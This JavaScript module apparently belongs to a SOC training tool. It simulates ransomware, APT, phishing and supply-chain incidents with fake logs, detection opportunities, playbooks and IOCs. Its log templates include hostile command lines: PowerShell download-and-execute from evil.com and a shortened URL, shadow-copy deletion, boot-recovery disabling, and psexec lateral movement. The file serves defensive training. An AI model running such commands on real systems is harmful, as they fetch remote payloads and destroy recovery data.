/**
 * ══════════════════════════════════════════════════════════════════════
 *  RAKAY — Incident Simulation Engine  v1.0
 *
 *  Given a scenario (e.g. "ransomware", "APT espionage", "phishing"),
 *  outputs:
 *   ✅ Complete attack chain with timeline
 *   ✅ Simulated log events (Windows, Sysmon, network)
 *   ✅ Detection opportunities per phase
 *   ✅ Response playbook steps
 *   ✅ IOC indicators for threat hunting
 *   ✅ Formatted SOC-ready output
 * ══════════════════════════════════════════════════════════════════════
 */
'use strict';

const { defaultCorrelator, ATTACK_CHAINS } = require('./threat-correlation');
const { defaultEngine }  = require('./detection-engine');
const { defaultDB }      = require('./intel-db');

// ─────────────────────────────────────────────────────────────────────────────
//  LOG TEMPLATES — realistic simulated event snippets
// ─────────────────────────────────────────────────────────────────────────────
const LOG_TEMPLATES = {
  ps_encoded: (host, user) => ({
    source: 'Sysmon / Windows Security', event_id: '4688 + 4104',
    level: 'HIGH',
    raw: `TimeCreated: ${_ts()} | EventID: 4688 | Computer: ${host}
ProcessName: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
CommandLine: powershell.exe -nop -w hidden -encodedcommand JABzAD0ATgBlAHcA...
User: ${user} | ParentProcess: winword.exe
---
TimeCreated: ${_ts()} | EventID: 4104 | Computer: ${host}
ScriptBlockText: $s=New-Object IO.MemoryStream([Convert]::FromBase64String("H4sI...")); ...
            IEX (New-Object Net.WebClient).DownloadString('http://evil.com/stage2.ps1')`,
    detection_note: 'Encoded PowerShell from Office parent + DownloadString = likely initial compromise'
  }),
  lsass_dump: (host, user) => ({
    source: 'Sysmon', event_id: '10',
    level: 'CRITICAL',
    raw: `TimeCreated: ${_ts()} | EventID: 10 (ProcessAccess) | Computer: ${host}
SourceImage: C:\\Users\\${user}\\AppData\\Local\\Temp\\svhost.exe
TargetImage: C:\\Windows\\System32\\lsass.exe
GrantedAccess: 0x1F1FFF
CallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+...`,
    detection_note: 'LSASS access from AppData path with full access rights = credential dumping'
  }),
  shadow_delete: (host, user) => ({
    source: 'Windows Security / Process Creation', event_id: '4688',
    level: 'CRITICAL',
    raw: `TimeCreated: ${_ts()} | EventID: 4688 | Computer: ${host}
ProcessName: C:\\Windows\\System32\\vssadmin.exe
CommandLine: vssadmin delete shadows /all /quiet
User: ${user} (SYSTEM) | ParentProcess: svchost.exe
---
TimeCreated: ${_ts(3)} | EventID: 4688 | Computer: ${host}
ProcessName: C:\\Windows\\System32\\bcdedit.exe
CommandLine: bcdedit /set {default} recoveryenabled no
User: ${user} (SYSTEM)`,
    detection_note: 'Shadow deletion + boot recovery disabled = ransomware pre-encryption phase'
  }),
  scheduled_task: (host, user) => ({
    source: 'Windows Security', event_id: '4698',
    level: 'HIGH',
    raw: `TimeCreated: ${_ts()} | EventID: 4698 (Task Created) | Computer: ${host}
TaskName: \\Microsoft\\Windows\\WindowsBackup\\ConfigNotification
TaskContent: <Actions><Exec><Command>powershell.exe</Command>
             <Arguments>-enc JAB...</Arguments></Exec></Actions>
SubjectUserName: ${user}`,
    detection_note: 'Scheduled task with encoded PowerShell in system-looking path = persistence'
  }),
  rdp_lateral: (source_host, dest_host, user) => ({
    source: 'Windows Security', event_id: '4624',
    level: 'HIGH',
    raw: `TimeCreated: ${_ts()} | EventID: 4624 | Computer: ${dest_host}
LogonType: 10 (RemoteInteractive)
TargetUserName: ${user} | WorkstationName: ${source_host}
IpAddress: 10.1.0.${Math.floor(Math.random()*200)+10}
AuthenticationPackageName: NTLM | LogonProcessName: NtLmSsp`,
    detection_note: `RDP from workstation (${source_host}) to server (${dest_host}) with NTLM = potential lateral movement`
  }),
  file_encrypt: (host, user) => ({
    source: 'Sysmon / File System', event_id: '11 (FileCreate)',
    level: 'CRITICAL',
    raw: `TimeCreated: ${_ts()} | EventID: 11 | Computer: ${host}
Image: C:\\ProgramData\\svchost32.exe
TargetFilename: C:\\Users\\${user}\\Documents\\budget_2024.xlsx.locked
---
TimeCreated: ${_ts(1)} | EventID: 11 | Computer: ${host}
TargetFilename: C:\\Users\\${user}\\Documents\\Q4_report.pptx.locked
---
TimeCreated: ${_ts(2)} | EventID: 11 | Computer: ${host}
TargetFilename: C:\\Shares\\Finance\\payroll.xlsx.locked
[... 2,847 more file encryption events in next 90 seconds ...]`,
    detection_note: 'Mass file rename to .locked extension = active ransomware encryption. ISOLATE IMMEDIATELY'
  }),
  dns_c2: (host) => ({
    source: 'DNS / Network', event_id: 'DNS Query',
    level: 'HIGH',
    raw: `TimeCreated: ${_ts()} | DNS Query | Source: ${host}
Query: 7f3a9b2c1d4e5f6a.c2infra-cdn.com Type: A
Query: 8g4h0i1j2k3l4m5n.c2infra-cdn.com Type: A
Query: 9o5p6q7r8s9t0u1v.c2infra-cdn.com Type: A
[High-entropy subdomain pattern - 47 unique queries in 10 minutes]
Destination: 185.220.101.47:443 (Known C2 infrastructure)`,
    detection_note: 'High-entropy subdomains with regular intervals = DNS beaconing / C2 communication'
  }),
  smb_lateral: (host, dest, user) => ({
    source: 'Windows Security', event_id: '5140',
    level: 'HIGH',
    raw: `TimeCreated: ${_ts()} | EventID: 5140 (Network Share Access) | Computer: ${dest}
ShareName: \\\\${dest}\\ADMIN$
ObjectType: File | AccessMask: 0x1
SubjectUserName: ${user} | SubjectDomainName: CORP
IpAddress: 10.1.0.${Math.floor(Math.random()*100)+10}
---
TimeCreated: ${_ts(2)} | EventID: 4648 | Computer: ${host}
TargetServerName: ${dest} | TargetUserName: ${user}
CommandLine: psexec.exe \\\\${dest} -u ${user} -p ... cmd.exe`,
    detection_note: `Admin share access via psexec from ${host} = lateral movement`
  }),
  phishing_macro: (host, user) => ({
    source: 'Sysmon / Windows Security', event_id: '4688',
    level: 'HIGH',
    raw: `TimeCreated: ${_ts()} | EventID: 4688 | Computer: ${host}
ProcessName: C:\\Windows\\System32\\cmd.exe
ParentProcessName: C:\\Program Files\\Microsoft Office\\OFFICE16\\WINWORD.EXE
CommandLine: cmd /c powershell -nop -w hidden -c "iex(iwr 'https://bit.ly/3xxY')"
User: ${user}`,
    detection_note: 'cmd.exe spawned from winword.exe = macro execution, likely phishing delivery'
  }),
};

// ─────────────────────────────────────────────────────────────────────────────
//  RESPONSE PLAYBOOK TEMPLATES
// ─────────────────────────────────────────────────────────────────────────────
const PLAYBOOKS = {
  ransomware: {
    name: 'Ransomware Incident Response',
    priority: 'P1 - CRITICAL',
    sla: 'Immediate (0-15 minutes)',
    steps: [
      { order: 1, phase: 'Detect & Confirm', action: 'Verify ransomware indicators: encrypted files, ransom note, vssadmin/bcdedit processes', tool: 'EDR / File System Monitor', time: '5 min' },
      { order: 2, phase: 'Contain', action: 'IMMEDIATELY isolate affected hosts from network. Disable Wi-Fi, disconnect Ethernet. DO NOT power off.', tool: 'EDR isolation / Network ACL', time: '0-5 min' },
      { order: 3, phase: 'Contain', action: 'Block affected subnets at firewall. Quarantine VLAN if network-spread detected.', tool: 'Firewall / NAC', time: '5-10 min' },
      { order: 4, phase: 'Preserve', action: 'Capture memory dump before shutdown. Collect forensic image of affected systems.', tool: 'Winpmem / FTK Imager', time: '10-30 min' },
      { order: 5, phase: 'Assess', action: 'Identify Patient Zero (first infected system). Map spread scope across environment.', tool: 'EDR / SIEM query', time: '30-60 min' },
      { order: 6, phase: 'Notify', action: 'Alert CISO, legal, management. Engage cyber insurance if applicable. Consider law enforcement (FBI/CISA).', tool: 'Communication plan', time: '0-30 min parallel' },
      { order: 7, phase: 'Eradicate', action: 'Remove ransomware binary from all systems. Rebuild from known-good images where possible.', tool: 'EDR / SCCM reimaging', time: '4-48 hours' },
      { order: 8, phase: 'Recover', action: 'Restore from offline backups. Verify backup integrity before restore. Prioritize critical systems.', tool: 'Backup system', time: '24-72 hours' },
      { order: 9, phase: 'Post-Incident', action: 'Root cause analysis. Patch initial access vector. Update detections. Lessons learned.', tool: 'IR report', time: '1-2 weeks' },
    ],
    dont_do: [
      'Do NOT pay ransom without legal/leadership approval',
      'Do NOT reboot affected systems (may trigger failsafe encryption)',
      'Do NOT run AV scan before memory capture',
      'Do NOT reconnect to network until fully remediated',
    ],
    forensic_artifacts: ['$Recycle.Bin (ransom notes)', 'User temp directories', 'Task Scheduler XML files', 'Event logs 4688/4104', 'Prefetch files'],
  },
  apt_intrusion: {
    name: 'APT Intrusion Response',
    priority: 'P1 - CRITICAL',
    sla: 'Immediate',
    steps: [
      { order: 1, phase: 'Detect', action: 'Identify scope of compromise. Map all affected systems and accounts.', time: '1-4 hours' },
      { order: 2, phase: 'Contain', action: 'Reset all compromised credentials. DO NOT alert adversary prematurely.', time: '4-8 hours' },
      { order: 3, phase: 'Investigate', action: 'Full forensic collection. Timeline reconstruction. C2 infrastructure mapping.', time: '1-3 days' },
      { order: 4, phase: 'Eradicate', action: 'Simultaneous removal from all systems. Patch initial vector. Block C2 infrastructure.', time: '1-2 days' },
      { order: 5, phase: 'Monitor', action: 'Enhanced monitoring for re-entry. Deception technology deployment.', time: 'Ongoing' },
    ],
    dont_do: [
      'Do NOT tip off adversary during investigation phase',
      'Do NOT change only some passwords (must be simultaneous)',
    ],
    forensic_artifacts: ['Registry run keys', 'Scheduled tasks', 'Service installations', 'WMI subscriptions', 'Network connections from lsass.exe'],
  },
  phishing: {
    name: 'Phishing Attack Response',
    priority: 'P2 - HIGH',
    sla: 'Within 1 hour',
    steps: [
      { order: 1, phase: 'Triage', action: 'Analyze phishing email headers, links, attachments in sandbox', time: '15-30 min' },
      { order: 2, phase: 'Contain', action: 'Block sender, domain, URLs at email gateway and proxy', time: '15-30 min' },
      { order: 3, phase: 'Scope', action: 'Search email system for all recipients of same campaign', time: '30-60 min' },
      { order: 4, phase: 'Investigate', action: 'Check if any users clicked link or opened attachment. Verify EDR telemetry.', time: '1-2 hours' },
      { order: 5, phase: 'User Action', action: 'Send awareness notification to affected users. Reset credentials if compromised.', time: '1 hour' },
      { order: 6, phase: 'Remediate', action: 'Pull malicious emails from all mailboxes using eDiscovery', time: '1-4 hours' },
    ],
    dont_do: ['Do NOT dismiss without checking all recipients'],
    forensic_artifacts: ['Email headers', 'Attachment sandbox report', 'Process tree from Office apps', 'Proxy logs for URL access'],
  },
};

// ─────────────────────────────────────────────────────────────────────────────
//  INCIDENT SIMULATOR
// ─────────────────────────────────────────────────────────────────────────────
class IncidentSimulator {
  constructor() {
    this.version = '1.0';
    this.correlator = defaultCorrelator;
    this.detectionEngine = defaultEngine;
    this.db = defaultDB;
  }

  // ── Main simulate method ──────────────────────────────────────────────────
  simulate(scenario, options = {}) {
    const normalised = scenario.toLowerCase().trim();
    const type = this._detectScenarioType(normalised);
    const chain = this.correlator.buildAttackChain(normalised);

    const hosts = options.hosts || ['CORP-WS-042', 'CORP-SRV-001', 'CORP-DC-001'];
    const users = options.users || ['jsmith', 'CORP\\svc_backup', 'SYSTEM'];

    switch (type) {
      case 'ransomware':    return this._simulateRansomware(hosts, users, chain);
      case 'apt':           return this._simulateAPT(hosts, users, chain);
      case 'phishing':      return this._simulatePhishing(hosts, users, chain);
      case 'supply_chain':  return this._simulateSupplyChain(hosts, users, chain);
      default:              return this._simulateGeneric(normalised, hosts, users, chain);
    }
  }

  // ── Ransomware scenario ───────────────────────────────────────────────────
  _simulateRansomware(hosts, users, chain) {
    const [ws1, srv1, dc1] = hosts;
    const [user1] = users;
    const t0 = new Date();

    const timeline = [
      { time: _tsRelative(t0, 0),   phase: 'Initial Access (T1566.001)', action: `User ${user1} on ${ws1} opened phishing attachment "Invoice_Q4.docm"`, severity: 'HIGH', log: LOG_TEMPLATES.phishing_macro(ws1, user1) },
      { time: _tsRelative(t0, 2),   phase: 'Execution (T1059.001)', action: 'PowerShell encoded command executed — downloads Stage 2 beacon', severity: 'HIGH', log: LOG_TEMPLATES.ps_encoded(ws1, user1) },
      { time: _tsRelative(t0, 5),   phase: 'C2 Established (T1071.001)', action: 'HTTPS beacon to C2 infrastructure established (185.220.101.47:443)', severity: 'HIGH', log: LOG_TEMPLATES.dns_c2(ws1) },
      { time: _tsRelative(t0, 15),  phase: 'Persistence (T1053.005)', action: 'Scheduled task created for persistent access — mimics Windows Update', severity: 'HIGH', log: LOG_TEMPLATES.scheduled_task(ws1, user1) },
      { time: _tsRelative(t0, 20),  phase: 'Credential Access (T1003)', action: `LSASS memory dumped on ${ws1} — domain credentials harvested`, severity: 'CRITICAL', log: LOG_TEMPLATES.lsass_dump(ws1, user1) },
      { time: _tsRelative(t0, 35),  phase: 'Lateral Movement (T1021.002)', action: `SMB/psexec lateral movement from ${ws1} to ${srv1}`, severity: 'HIGH', log: LOG_TEMPLATES.smb_lateral(ws1, srv1, user1) },
      { time: _tsRelative(t0, 45),  phase: 'Lateral Movement (T1021.001)', action: `RDP from ${srv1} to ${dc1} using harvested domain admin credentials`, severity: 'CRITICAL', log: LOG_TEMPLATES.rdp_lateral(srv1, dc1, 'corp\\domainadmin') },
      { time: _tsRelative(t0, 60),  phase: 'Impact: Recovery Inhibition (T1490)', action: `Shadow copies deleted on all reachable hosts — recovery blocked`, severity: 'CRITICAL', log: LOG_TEMPLATES.shadow_delete(dc1, 'SYSTEM') },
      { time: _tsRelative(t0, 65),  phase: 'Impact: Encryption (T1486)', action: '⚠️ RANSOMWARE ENCRYPTION STARTED — 2,847+ files encrypted in first 90 seconds', severity: 'CRITICAL', log: LOG_TEMPLATES.file_encrypt(ws1, user1) },
    ];

    const detectionOpportunities = [
      { phase: 'T0+2min', technique: 'T1059.001', opportunity: 'PowerShell Script Block logging (Event ID 4104) would reveal DownloadString payload', coverage: 'MEDIUM', rule_available: true },
      { phase: 'T0+5min', technique: 'T1071.001', opportunity: 'DNS query to high-entropy subdomain / new external domain = C2 callback', coverage: 'HIGH', rule_available: true },
      { phase: 'T0+20min', technique: 'T1003', opportunity: 'Sysmon Event ID 10 (LSASS access) from non-system process', coverage: 'HIGH', rule_available: true },
      { phase: 'T0+35min', technique: 'T1021.002', opportunity: 'Admin share access + psexec.exe from workstation is anomalous', coverage: 'MEDIUM', rule_available: true },
      { phase: 'T0+60min', technique: 'T1490', opportunity: 'vssadmin.exe delete shadows = CRITICAL pre-encryption indicator', coverage: 'HIGH', rule_available: true },
      { phase: 'T0+65min', technique: 'T1486', opportunity: 'Mass file rename (>20/min) to .locked extension — endpoint canary files', coverage: 'HIGH', rule_available: true },
    ];

    return {
      scenario: 'ransomware',
      displayName: 'Ransomware Attack Simulation',
      severity: 'CRITICAL',
      timeline,
      detectionOpportunities,
      playbook: PLAYBOOKS.ransomware,
      iocs: this._getRansomwareIOCs(),
      detectionQueries: this._getTopDetections(['T1059.001','T1003','T1490','T1486']),
      summary: {
        totalPhases: timeline.length,
        criticalEvents: timeline.filter(e => e.severity === 'CRITICAL').length,
        durationMinutes: 65,
        firstDetectableAt: 'T0+2min (if Script Block logging enabled)',
        estimatedDamage: '2,800+ files encrypted across 3+ systems',
        recommendation: '🔴 **IMMEDIATE ISOLATION REQUIRED**: Disconnect affected hosts from network NOW. Do not reboot.',
      }
    };
  }

  // ── APT Espionage scenario ────────────────────────────────────────────────
  _simulateAPT(hosts, users, chain) {
    const [ws1, srv1, dc1] = hosts;
    const [user1] = users;
    const t0 = new Date();

    const timeline = [
      { time: _tsRelative(t0, 0),   phase: 'Initial Access (T1566.001)', action: `Spearphishing email delivered to ${user1} — malicious Word doc with CVE-2022-30190 (Follina)`, severity: 'HIGH', log: LOG_TEMPLATES.phishing_macro(ws1, user1) },
      { time: _tsRelative(t0, 1),   phase: 'Execution (T1059.001)', action: 'Cobalt Strike beacon loaded via PowerShell in-memory stager', severity: 'HIGH', log: LOG_TEMPLATES.ps_encoded(ws1, user1) },
      { time: _tsRelative(t0, 5),   phase: 'C2 (T1071.001)', action: 'Malleable C2 profile mimicking Microsoft Update traffic established', severity: 'HIGH', log: LOG_TEMPLATES.dns_c2(ws1) },
      { time: _tsRelative(t0, 30),  phase: 'Persistence (T1547.001)', action: 'Registry run key added — persists across reboots using LOLBins', severity: 'MEDIUM', log: LOG_TEMPLATES.scheduled_task(ws1, user1) },
      { time: _tsRelative(t0, 120), phase: 'Credential Access (T1003)', action: `Cobalt Strike mimikatz executed — domain credentials harvested from ${ws1}`, severity: 'CRITICAL', log: LOG_TEMPLATES.lsass_dump(ws1, user1) },
      { time: _tsRelative(t0, 180), phase: 'Lateral Movement (T1021.001)', action: `RDP to ${srv1} with domain admin credentials — elevated to Exchange`, severity: 'HIGH', log: LOG_TEMPLATES.rdp_lateral(ws1, srv1, 'corp\\admin') },
      { time: _tsRelative(t0, 300), phase: 'Collection (T1114)', action: 'Bulk email export targeting C-suite and security team mailboxes', severity: 'HIGH', log: { raw: `New-MailboxExportRequest -Mailbox ceo@corp.com -FilePath \\\\${srv1}\\export\\ceo.pst`, source: 'Exchange PowerShell', event_id: 'EAC-2003' } },
      { time: _tsRelative(t0, 360), phase: 'Exfiltration (T1048)', action: 'Data compressed and exfiltrated via HTTPS to actor-controlled cloud storage', severity: 'CRITICAL', log: LOG_TEMPLATES.dns_c2(srv1) },
    ];

    const detectionOpportunities = [
      { phase: 'T0+5min', technique: 'T1071.001', opportunity: 'Beaconing pattern detection — regular interval C2 callbacks', coverage: 'MEDIUM', rule_available: true },
      { phase: 'T0+120min', technique: 'T1003', opportunity: 'LSASS access from Cobalt Strike process — Sysmon Event ID 10', coverage: 'HIGH', rule_available: true },
      { phase: 'T0+180min', technique: 'T1021.001', opportunity: 'Admin RDP from non-jump-server host', coverage: 'HIGH', rule_available: true },
      { phase: 'T0+300min', technique: 'T1114', opportunity: 'New-MailboxExportRequest from non-Exchange admin account', coverage: 'HIGH', rule_available: true },
    ];

    return {
      scenario: 'apt_espionage',
      displayName: 'APT Espionage Campaign Simulation',
      severity: 'CRITICAL',
      timeline,
      detectionOpportunities,
      playbook: PLAYBOOKS.apt_intrusion,
      iocs: ['-encodedcommand', 'winword.exe → cmd.exe → powershell.exe', 'New-MailboxExportRequest', 'Cobalt Strike watermark: 1359593325'],
      detectionQueries: this._getTopDetections(['T1059.001','T1071.001','T1003','T1114']),
      summary: {
        totalPhases: timeline.length,
        criticalEvents: timeline.filter(e => e.severity === 'CRITICAL').length,
        durationMinutes: 360,
        firstDetectableAt: 'T0+5min (C2 beaconing)',
        estimatedDamage: 'Executive email exfiltration, domain admin credential theft',
        recommendation: '🔴 Investigate beaconing pattern immediately. Do NOT alert attacker prematurely.',
      }
    };
  }

  // ── Phishing scenario ─────────────────────────────────────────────────────
  _simulatePhishing(hosts, users, chain) {
    const [ws1] = hosts;
    const [user1] = users;
    const t0 = new Date();

    const timeline = [
      { time: _tsRelative(t0, 0),  phase: 'Delivery (T1566.001)', action: `Phishing email received by ${user1} — "Urgent: Invoice Overdue — Action Required"`, severity: 'HIGH', log: { raw: `From: finance-noreply@invoices-corp365.com\nSubject: URGENT: Invoice #10293 - ACTION REQUIRED\nAttachment: Invoice_10293.docm (macro-enabled Word document)`, source: 'Email Gateway', event_id: 'SMTP' } },
      { time: _tsRelative(t0, 8),  phase: 'Execution (T1059.001)', action: 'User enabled macros — malicious VBA launched PowerShell stager', severity: 'HIGH', log: LOG_TEMPLATES.phishing_macro(ws1, user1) },
      { time: _tsRelative(t0, 10), phase: 'Malware Download (T1105)', action: 'Stage 2 payload downloaded from attacker CDN and executed', severity: 'HIGH', log: LOG_TEMPLATES.ps_encoded(ws1, user1) },
      { time: _tsRelative(t0, 15), phase: 'Credential Harvesting (T1056)', action: 'Fake Microsoft 365 login page presented — credentials captured', severity: 'HIGH', log: { raw: `Process: chrome.exe navigated to hxxps://login.microsoftonline-secure.com[.]co\nDomain registered: 2 days ago | TLD: .co (Colombia)\nUser entered credentials on fake M365 login page`, source: 'Proxy / EDR', event_id: 'Network' } },
    ];

    return {
      scenario: 'phishing',
      displayName: 'Phishing Attack Simulation',
      severity: 'HIGH',
      timeline,
      detectionOpportunities: [
        { phase: 'Delivery', technique: 'T1566.001', opportunity: 'Email gateway: sender domain age check, SPF/DKIM/DMARC validation', coverage: 'HIGH', rule_available: false },
        { phase: 'Execution', technique: 'T1059.001', opportunity: 'Office application spawning cmd/PowerShell (Sysmon 4688)', coverage: 'HIGH', rule_available: true },
        { phase: 'Credential', technique: 'T1056', opportunity: 'Proxy: access to newly-registered domain or impossible travel after credential submission', coverage: 'MEDIUM', rule_available: false },
      ],
      playbook: PLAYBOOKS.phishing,
      iocs: ['invoices-corp365.com', 'microsoftonline-secure.com.co', '-enc PowerShell in winword child', 'Stage2 download URL'],
      detectionQueries: this._getTopDetections(['T1566.001','T1059.001']),
      summary: {
        totalPhases: timeline.length,
        criticalEvents: 0,
        durationMinutes: 15,
        firstDetectableAt: 'Email delivery (gateway)',
        estimatedDamage: 'Credential theft, potential O365 account takeover',
        recommendation: '🟡 Block sender domain, search all mailboxes, reset user credentials.',
      }
    };
  }

  // ── Supply chain scenario ─────────────────────────────────────────────────
  _simulateSupplyChain(hosts, users, chain) {
    return {
      scenario: 'supply_chain',
      displayName: 'Software Supply Chain Attack Simulation',
      severity: 'CRITICAL',
      timeline: [
        { time: _tsRelative(new Date(), 0), phase: 'Supply Chain Compromise', action: 'Trojanized software update deployed via legitimate update mechanism (T1195.002)', severity: 'CRITICAL', log: { raw: 'Software version 3.2.1 contains backdoored DLL: solarwinds.businesslayerhost.exe\nDigital signature valid — signed with vendor cert\nC2: avsvmcloud.com (DGA subdomain)', source: 'EDR / Threat Intel', event_id: 'Process' } },
        { time: _tsRelative(new Date(), 1440), phase: 'Dormancy Period', action: 'Malware dormant for 14 days to evade sandbox detection (T1497)', severity: 'MEDIUM', log: { raw: 'No suspicious activity detected for 2 weeks\nBeacon disabled during dormancy period', source: 'EDR (retrospective)', event_id: 'N/A' } },
        { time: _tsRelative(new Date(), 2160), phase: 'C2 Activation', action: 'Beacon activated — callbacks to attacker-controlled AWS/Azure infrastructure (T1071.001)', severity: 'CRITICAL', log: LOG_TEMPLATES.dns_c2(hosts[0]) },
      ],
      detectionOpportunities: [
        { phase: 'Initial', technique: 'T1195.002', opportunity: 'Hash comparison of software updates against vendor-signed checksums', coverage: 'LOW', rule_available: false },
        { phase: 'C2', technique: 'T1071.001', opportunity: 'DGA domain detection — random-looking subdomain patterns', coverage: 'MEDIUM', rule_available: true },
      ],
      playbook: PLAYBOOKS.apt_intrusion,
      iocs: ['avsvmcloud.com', 'freescanonline.com', 'deftsecurity.com', 'solarwinds.businesslayerhost.exe (backdoored)'],
      detectionQueries: this._getTopDetections(['T1195','T1071.001']),
      summary: {
        totalPhases: 3,
        criticalEvents: 2,
        durationMinutes: 2160,
        firstDetectableAt: 'C2 activation phase (DGA pattern)',
        estimatedDamage: 'Full network compromise via trusted software channel',
        recommendation: '🔴 Audit all third-party software. Hash all installed binaries. Check SolarWinds/Orion indicators.',
      }
    };
  }

  // ── Generic scenario ──────────────────────────────────────────────────────
  _simulateGeneric(scenario, hosts, users, chain) {
    if (chain) {
      return {
        scenario,
        displayName: `${scenario.charAt(0).toUpperCase()}${scenario.slice(1)} Attack Simulation`,
        severity: 'HIGH',
        timeline: chain.phases.map((phase, i) => ({
          time: _tsRelative(new Date(), i * 10),
          phase: `${phase.phase} (${phase.technique})`,
          action: phase.description,
          severity: phase.technique.startsWith('T1486') || phase.technique.startsWith('T1003') ? 'CRITICAL' : 'HIGH',
          log: { raw: `# ${phase.phase}\n# Technique: ${phase.technique}\n# Tool: ${phase.tool}\n# ${phase.description}`, source: 'Simulated', event_id: 'N/A' }
        })),
        detectionOpportunities: chain.phases.slice(0, 5).map(phase => ({
          phase: phase.phase,
          technique: phase.technique,
          opportunity: `Monitor for ${phase.tool} usage in context of ${phase.phase}`,
          coverage: 'MEDIUM',
          rule_available: !!this.detectionEngine.getTechniqueInfo(phase.technique),
        })),
        playbook: { name: `${scenario} Response`, steps: [], recommendation: 'Follow standard IR procedures. Isolate, investigate, remediate.' },
        iocs: chain.iocs || [],
        detectionQueries: this._getTopDetections(chain.detection_priority || []),
        summary: {
          totalPhases: chain.phases.length,
          criticalEvents: 1,
          durationMinutes: chain.phases.length * 10,
          firstDetectableAt: 'Initial access phase',
          estimatedDamage: 'Scenario-dependent',
          recommendation: `Monitor for ${chain.description}`,
        }
      };
    }

    return {
      scenario,
      displayName: `${scenario} — Simulation`,
      severity: 'HIGH',
      message: `No predefined simulation for "${scenario}". Supported scenarios: ransomware, apt espionage, phishing, supply chain.`,
      available: Object.keys(ATTACK_CHAINS),
    };
  }

  // ── Detection queries ─────────────────────────────────────────────────────
  _getTopDetections(techniqueIds) {
    return techniqueIds.slice(0, 3).map(id => {
      const kql = this.detectionEngine.generateKQL(id);
      const sigma = this.detectionEngine.generateSigma(id);
      if (kql.found === false) return null;
      return {
        technique: id,
        name: kql.name,
        kql: kql.content,
        sigma: sigma.found === false ? null : sigma.content,
      };
    }).filter(Boolean);
  }

  _getRansomwareIOCs() {
    return [
      'vssadmin.exe delete shadows /all /quiet',
      'bcdedit /set {default} recoveryenabled no',
      'wmic shadowcopy delete',
      'wbadmin delete catalog -quiet',
      'Process: svchost32.exe in ProgramData or AppData',
      'File extension: .locked, .encrypted, .crypted',
      'Ransom note: README.txt, HOW_TO_DECRYPT.txt, !DECRYPT_FILES!.txt',
      'C2: 185.220.101.0/24 (Tor exit nodes commonly used)',
    ];
  }

  _detectScenarioType(s) {
    if (/ransom|encrypt|lockbit|blackcat|cl0p|ryuk|conti|revil/.test(s)) return 'ransomware';
    if (/apt|espionage|nation.?state|advanced persistent|cozy bear|fancy bear|lazarus/.test(s)) return 'apt';
    if (/phish|spearphish|email|attachment|macro/.test(s)) return 'phishing';
    if (/supply.?chain|solarwind|3cx|build.?pipeline|trojanized/.test(s)) return 'supply_chain';
    return 'generic';
  }

  // ── Formatted SOC output ──────────────────────────────────────────────────
  formatForSOC(result) {
    if (!result || result.message) {
      return `## Incident Simulation\n\n⚠️ ${result ? result.message : 'Simulation failed'}\n\n**Available scenarios**: ${(result && result.available || []).join(', ')}`;
    }

    const lines = [
      `## Overview`,
      `**Scenario**: ${result.displayName}`,
      `**Severity**: ${result.severity} | **Duration**: ~${result.summary.durationMinutes} minutes`,
      `**First Detection Point**: ${result.summary.firstDetectableAt}`,
      ``,
      `## Why It Matters`,
      `${result.summary.estimatedDamage}`,
      `${result.summary.recommendation}`,
      ``,
      `## Attack Timeline`,
      ...result.timeline.map(e =>
        `### ${e.phase}\n**[${e.time}]** ${e.action}\n**Severity**: ${e.severity}\n\`\`\`log\n${e.log.raw.substring(0, 400)}\n\`\`\``
      ),
      ``,
      `## Detection Guidance`,
      `**Detection Opportunities**:`,
      ...result.detectionOpportunities.map(d =>
        `- **${d.phase}** (${d.technique}): ${d.opportunity} — Coverage: ${d.coverage}${d.rule_available ? ' ✅ Rule available' : ' ⚠️ No rule'}`
      ),
      result.detectionQueries && result.detectionQueries.length > 0 ? [
        `\n**Top Detection Queries**:`,
        ...result.detectionQueries.map(q =>
          `**${q.technique} — ${q.name}**\n\`\`\`kql\n${q.kql.substring(0, 300)}\n\`\`\``
        )
      ].join('\n') : '',
      ``,
      `## Mitigation`,
      ...(result.playbook && result.playbook.steps ? [
        `**Playbook**: ${result.playbook.name}`,
        ...result.playbook.steps.slice(0, 5).map(s => `${s.order}. **[${s.phase}]** ${s.action} _(${s.time})_`),
        ...(result.playbook.dont_do || []).map(d => `⛔ ${d}`),
      ] : ['Apply standard IR procedures.']),
      ``,
      `## Analyst Tip`,
      result.iocs && result.iocs.length > 0 ? `**Key IOCs to hunt**:\n${result.iocs.map(i => `- \`${i}\``).join('\n')}` : '',
    ].filter(l => l !== undefined && l !== null);

    return lines.join('\n');
  }
}

// ─────────────────────────────────────────────────────────────────────────────
//  HELPERS
// ─────────────────────────────────────────────────────────────────────────────
function _ts(offsetMin = 0) {
  const d = new Date(Date.now() + offsetMin * 60000);
  return d.toISOString().replace('T', ' ').substring(0, 19);
}

function _tsRelative(base, offsetMin) {
  const d = new Date(base.getTime() + offsetMin * 60000);
  return d.toISOString().replace('T', ' ').substring(0, 19);
}

// ─────────────────────────────────────────────────────────────────────────────
//  EXPORTS
// ─────────────────────────────────────────────────────────────────────────────
const defaultSimulator = new IncidentSimulator();

module.exports = {
  IncidentSimulator,
  defaultSimulator,
  PLAYBOOKS,
  simulate:     (scenario, opts) => defaultSimulator.simulate(scenario, opts),
  formatForSOC: (result)         => defaultSimulator.formatForSOC(result),
  getPlaybook:  (type)           => PLAYBOOKS[type] || null,
};
